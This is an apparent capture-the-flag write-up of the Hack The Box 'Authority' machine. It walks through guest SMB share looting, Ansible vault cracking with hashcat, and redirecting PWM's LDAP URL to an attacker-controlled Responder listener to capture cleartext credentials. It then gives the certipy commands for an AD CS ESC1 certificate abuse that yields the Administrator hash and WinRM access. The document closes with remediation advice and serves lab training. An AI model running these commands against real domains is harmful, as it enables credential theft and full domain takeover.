---
title: "Authority — AD CS ESC1 via Ansible Vault Credential Exposure"
description: "An exposed Ansible vault and rogue LDAP listener expose service credentials, enabling ESC1 certificate abuse for Domain Administrator."
type: case-study
platform: Hack The Box
content_type: machine
status: published-ready
addedAt: "2026-09-14"
tags:
  - windows
  - active-directory
  - ad-cs
  - esc1
  - ansible
  - credential-exposure
objective: "Medium AD lab with PWM/SMB exposure and Ansible-vault credential leakage"
tools:
  - rustscan
  - nxc
  - ansible2john
  - hashcat
  - ansible-vault
  - Responder
  - rusthound-ce
  - certipy
  - evil-winrm
skill: "AD CS ESC1 abuse with rogue-LDAP credential capture"
outcome: "Certificate-authenticated administrative access"
---

## Summary

Authority is a Medium-rated Hack The Box Windows Active Directory lab where an open PWM configuration portal and guest SMB access expose Ansible vault files containing domain credentials. PWM administrative access allows LDAP profile manipulation to capture service account credentials via a rogue LDAP listener. The captured service account lacks direct certificate enrollment rights, but the domain permits non-privileged users to create machine accounts (MAQ=10). A new computer account enrolls the ESC1-vulnerable `<VULN_TEMPLATE>` certificate template with the Administrator's UPN, yielding the Administrator NTLM hash. Adding the service account to the built-in Administrators group provides WinRM access with full Domain Controller privileges. Credential values, target addresses, and service account identifiers are redacted below; command patterns are preserved.

## Context and Objective

- **Target:** Windows Active Directory Domain Controller (Medium difficulty)
- **Services exposed:** DNS (53), HTTP/IIS (80), Kerberos (88), RPC (135), NetBIOS (139), LDAP (389/636), SMB (445), WinRM (5985), Tomcat/PWM (8443), .NET Framing (9389)
- **Objective:** Achieve Domain Administrator privileges through the attack surface presented by exposed services
- **Lab context:** Hack The Box lab; all activity described was performed within the platform's isolated lab environment

## Approach and Evidence

### 1. Service Enumeration

Observation: the exposed services identify the host as an Active Directory Domain Controller with LDAP, Kerberos, SMB, and WinRM. The LDAP certificate is signed by the internal CA `<INTERNAL_CA>`. Port 8443 runs an Apache Tomcat application (PWM). Port 80 serves a default IIS page.

Action: fast TCP scan to enumerate open ports and service versions.

```bash
rustscan -a <TARGET_IP> --ulimit 5000 -- -Pn -sC -sV -oN nmap/<SCAN_OUTPUT>
```

Representative excerpt (truncated):

```text
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0
8443/tcp  open  ssl/http      Apache Tomcat (language: en)
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0
```

Technical significance: the service fingerprint confirms an AD DC with certificate infrastructure (CA-signed LDAP cert), a self-service password portal (PWM on Tomcat), and SMB with guest-accessible shares.

Result: the recorded output shows AD DC services including LDAP, Kerberos, SMB, WinRM, and PWM.

### 2. PWM Discovery

Observation: port 8443 hosts PWM (Project PWM), an open-source LDAP password self-service portal. The application is in open configuration mode, allowing unauthenticated access to its configuration editor.

Action: navigate to the PWM login page.

```text
https://<TARGET_IP>:8443/pwm/private/login
```

Representative excerpt:

```text
PWM is in open configuration mode and is not secure.
```

Technical significance: open configuration mode means anyone can access the PWM configuration editor without authentication, exposing the LDAP infrastructure configuration. This is the initial foothold vector.

Result: the notes report PWM in open configuration mode with full LDAP configuration accessible.

### 3. Guest SMB Access

Observation: guest access is accepted over SMB, allowing share enumeration. The `<SENSITIVE_SHARE>` share is readable as Guest.

Action: enumerate SMB shares with guest credentials.

```bash
nxc smb <TARGET_IP> -u 'a' -p '' --shares
```

Representative excerpt (structure only):

```text
SMB         <TARGET_IP>   445    <DC_HOSTNAME>    Share           Permissions    Remark
SMB         <TARGET_IP>   445    <DC_HOSTNAME>    -----           -----------    ------
SMB         <TARGET_IP>   445    <DC_HOSTNAME>    <SENSITIVE_SHARE>   READ
SMB         <TARGET_IP>   445    <DC_HOSTNAME>    IPC$            READ           Remote IPC
SMB         <TARGET_IP>   445    <DC_HOSTNAME>    NETLOGON                        Logon server share
SMB         <TARGET_IP>   445    <DC_HOSTNAME>    SYSVOL                          Logon server share
```

Action: spider the `<SENSITIVE_SHARE>` share to download accessible content.

```bash
nxc smb <TARGET_IP> -u 'a' -p '' -M spider_plus
```

Result: the notes report the `<SENSITIVE_SHARE>` share contents retrieved for offline analysis.

### 4. Ansible Vault Discovery

Observation: the downloaded `<SENSITIVE_SHARE>` share contains Ansible automation files for PWM, including vault-encrypted credential files.

Action: inspect the downloaded directory structure.

```text
<TARGET_IP>/<SENSITIVE_SHARE>/Automation/Ansible/PWM/defaults
```

This directory contains a `main.yaml` configuration file alongside three Ansible vault-encrypted files:

- `ldap_admin_password`
- `pwm_admin_password`
- `pwm_admin_login`

Technical significance: Ansible vault files store encrypted credentials. The vault password strength determines security; weak passwords are crackable with standard wordlists.

Result: the notes report three vault-encrypted credential files discovered in the `<SENSITIVE_SHARE>` share.

### 5. Ansible Vault Cracking

Observation: vault files can be converted to hash format for offline cracking. All three share the same vault password.

Action: convert vault files to hash format, then crack with a wordlist.

```bash
ansible2john ldap_admin_password pwm_admin_password pwm_admin_login > vault.hash
hashcat vault.hash /usr/share/wordlists/rockyou.txt --username
```

Representative excerpt (password redacted):

```text
$ansible$0*0*<HASH>:<VAULT_PASSWORD>
```

Technical significance: Ansible vault uses a custom hash format compatible with John the Ripper and Hashcat. Weak vault passwords fall quickly to dictionary attacks.

Result: the notes report all three vault files cracked with the same password (value redacted).

### 6. Vault Decryption

Observation: the cracked password decrypts all three vault files, revealing domain credentials.

Action: decrypt each vault file using the cracked password.

```bash
printf '%s' '<VAULT_PASSWORD>' > /tmp/vaultpass
chmod 600 /tmp/vaultpass
ansible-vault decrypt ldap_admin_password --vault-password-file /tmp/vaultpass
ansible-vault decrypt pwm_admin_login --vault-password-file /tmp/vaultpass
ansible-vault decrypt pwm_admin_password --vault-password-file /tmp/vaultpass
```

Representative excerpt:

```text
Decryption successful
Decryption successful
Decryption successful
```

Technical significance: the decrypted files reveal three credentials: a PWM admin password, a PWM admin login (service account), and an LDAP bind password. The PWM service account provides administrative access to the PWM configuration editor.

Result: the notes report three decrypted files yielding a PWM admin login, PWM admin password, and LDAP bind password (values redacted).

### 7. PWM LDAP Configuration Manipulation

Observation: the PWM configuration editor is accessible with the decrypted PWM admin credentials. The LDAP server URL can be replaced with an attacker-controlled listener.

Action: authenticate to PWM, navigate to LDAP configuration, replace the legitimate LDAP server with a rogue listener.

```text
https://<TARGET_IP>:8443/pwm/private/config/editor
```

```text
LDAP Directorys -> default -> Connection -> LDAP URLs -> Remove -> <DOMAIN_FQDN> add -> ldap://<ATTACKER_IP>:389
```

Action: start a responder/rogue LDAP listener on the attacker machine.

```bash
sudo responder
```

Technical significance: PWM, when testing the modified LDAP profile, sends a bind request to the configured URL. Replacing the URL with an attacker-controlled listener captures the cleartext LDAP bind credentials.

Result: the notes report the PWM LDAP configuration modified to redirect bind requests.

### 8. Service Account Credential Capture

Observation: testing the modified LDAP profile from PWM causes the server to send cleartext LDAP bind credentials to the attacker listener.

Action: trigger the LDAP profile test from the PWM configuration interface.

```text
Test LDAP profile
```

Representative excerpt (values generalized):

```text
[LDAP] Cleartext Client   : <TARGET_IP>
[LDAP] Cleartext Username : CN=<SERVICE_ACCOUNT>,OU=Service Accounts,OU=CORP,DC=<DOMAIN>,DC=<TLD>
[LDAP] Cleartext Password : <LDAP_PASSWORD>
```

Technical significance: the PWM server sends the LDAP bind credentials in cleartext when testing the profile. This reveals the service account DN and password. The account has AD query rights and Certificate Authority interaction capability.

Result: the notes report cleartext LDAP credentials captured for a domain service account (values redacted).

### 9. AD CS Enumeration

Observation: BloodHound and certipy enumeration with the captured service account reveals an ESC1-vulnerable certificate template.

Action: collect domain attack path data and enumerate certificate authorities.

```bash
rusthound-ce --domain <DOMAIN> -u '<SERVICE_ACCOUNT>' -p '<LDAP_PASSWORD>' --zip -o <DOMAIN> --ldaps
nxc ldap <TARGET_IP> -u '<SERVICE_ACCOUNT>' -p '<LDAP_PASSWORD>' -M certipy-find
```

Representative excerpt:

```text
CERTIPY-... <TARGET_IP>   389    <DC_HOSTNAME>        [!] Vulnerabilities
CERTIPY-... <TARGET_IP>   389    <DC_HOSTNAME>          ESC1  : Enrollee supplies subject and template allows client authentication
```

Technical significance: ESC1 requires the certificate template to support client authentication EKU, allow the enrollee to supply the Subject Name and Subject Alternative Name (SAN), grant enrollment rights to a low-privileged principal, and impose no certificate manager approval or authorized signatures requirement. This combination permits certificate-based authentication as any specified user.

Result: the notes report the `<VULN_TEMPLATE>` template vulnerable to ESC1.

### 10. Machine Account Creation

Observation: the service account lacks direct enrollment rights on the `<VULN_TEMPLATE>` template. The Machine Account Quota (MAQ) is 10, allowing non-privileged users to create computer accounts.

Action: check MAQ, then create a machine account.

```bash
nxc ldap <TARGET_IP> -u '<SERVICE_ACCOUNT>' -p '<LDAP_PASSWORD>' -M maq
```

```text
MAQ         <TARGET_IP>   389    <DC_HOSTNAME>    MachineAccountQuota: 10
```

```bash
nxc ldap <TARGET_IP> -u '<SERVICE_ACCOUNT>' -p '<LDAP_PASSWORD>' -M add-computer -o NAME="<CREATED_PC>" PASSWORD="<MACHINE_PASSWORD>"
```

```text
ADD-COMP... <TARGET_IP>   389    <DC_HOSTNAME>    Successfully added "<CREATED_PC>$" with password "<MACHINE_PASSWORD>"
```

Technical significance: the domain allows non-privileged users to create up to 10 computer accounts. A new machine account inherits enrollment rights on templates that grant enrollment to "Domain Computers" or similar groups, bypassing the service account's lack of direct enrollment rights.

Result: the notes report a new machine account successfully created (credentials redacted).

### 11. ESC1 Certificate Abuse

Observation: the new machine account can enroll the `<VULN_TEMPLATE>` template. Requesting a certificate with the Administrator's UPN as the SAN yields a certificate that authenticates as Administrator.

Action: request a certificate with the Administrator's UPN, then authenticate.

```bash
certipy req -u '<CREATED_PC>$' -p '<MACHINE_PASSWORD>' -dc-ip <TARGET_IP> -ca '<INTERNAL_CA>' -target '<DC_FQDN>' -template '<VULN_TEMPLATE>' -upn 'administrator@<DOMAIN>'
```

```bash
certipy auth -pfx <ADMIN_PFX> -dc-ip <TARGET_IP>
```

Technical significance: ESC1 abuse works because the template allows the enrollee to specify any UPN in the SAN field. The CA issues a certificate for the specified UPN without verifying the enrollee's identity matches. The resulting PFX enables PKINIT authentication; certipy extracts the NTLM hash for the specified user.

Result: the notes report the Administrator NTLM hash obtained via certificate authentication (hash redacted).

### 12. Domain Administrator Access

Observation: with the Administrator hash, the LDAP shell is used to add the service account to the built-in Administrators group, then authenticate over WinRM.

Action: add the service account to the Administrators group via LDAP shell.

```bash
certipy auth -pfx <ADMIN_PFX> -dc-ip <TARGET_IP> -ldap-shell
```

```text
add_user_to_group <SERVICE_ACCOUNT> Administrators
```

Action: authenticate over WinRM with the service account credentials.

```bash
evil-winrm -i <TARGET_IP> -u <SERVICE_ACCOUNT> -p '<LDAP_PASSWORD>'
```

Technical significance: adding the service account to the Administrators group grants Domain Administrator privileges. WinRM provides a stable interactive shell with full admin access to the Domain Controller.

Result: the notes report full administrative access obtained on the Domain Controller.

## Challenges and Decisions

| Challenge | Decision | Rationale |
|---|---|---|
| Service account lacks enrollment rights on `<VULN_TEMPLATE>` template | Used Machine Account Quota to create a computer account | Domain MAQ=10 allows non-privileged users to create machine accounts that inherit template enrollment rights |
| PWM open configuration mode | Exploited unauthenticated config editor access | No authentication required; direct LDAP configuration manipulation possible |
| Weak Ansible vault password | Cracked with standard wordlist | Vault password fell to dictionary attack; demonstrates risk of weak vault encryption |

## Outcome

The evidence establishes: domain credential recovery via Ansible vault cracking from guest-accessible SMB shares; LDAP credential capture via PWM configuration manipulation and rogue listener; privilege escalation via AD CS ESC1 abuse through machine account creation and certificate-based authentication as Administrator. All steps abuse legitimate AD functionality and misconfigurations rather than software vulnerabilities.

**Attack chain:**
Guest SMB → Ansible vault files → vault cracking → PWM admin access → LDAP config manipulation → service account credential capture → MAQ machine account creation → ESC1 certificate abuse → Administrator NTLM hash → Domain Administrator via WinRM

## Lessons and Recommendations

Recommendations below follow the source remediation; none were re-tested during curation.

1. **Disable PWM open configuration mode.** Enforce authentication for all PWM administrative functions. Open configuration mode exposes LDAP infrastructure to unauthenticated manipulation. (Recommendation.)
2. **Restrict SMB guest access.** Audit readable shares for sensitive data. Guest-accessible shares should never contain credential-bearing automation files. (Recommendation.)
3. **Enforce strong vault passwords.** Use complex, unique passwords for Ansible vault encryption. Consider using managed identities or secrets management instead of shared vault passwords. (Recommendation.)
4. **Enforce LDAPS for all directory bind operations.** PWM sends LDAP bind credentials in cleartext; LDAPS prevents credential capture by rogue listeners. Validate LDAP server certificates. (Recommendation.)
5. **Restrict Machine Account Quota.** Reduce MAQ to 0 where machine account creation is not required. Prevents non-privileged users from creating accounts that inherit template enrollment rights. (Recommendation.)
6. **Restrict enrollment rights on ESC1-vulnerable templates.** Limit certificate template enrollment to authorized security groups. Remove SAN specification capability where not required. (Recommendation.)

Editorial MITRE view (mapping only, not a source claim): credential access via files on network share; credential manipulation via application configuration; privilege escalation via AD CS template abuse and machine account creation.

## References

- Hack The Box machine **[Authority](https://app.hackthebox.com/machines/Authority)** (retired lab; no active-instance detail)
- Microsoft documentation: Active Directory Certificate Services
- Project PWM: open-source LDAP password self-service portal
- Certipy: AD CS abuse toolkit
- `ansible2john` / Hashcat: Ansible vault password cracking
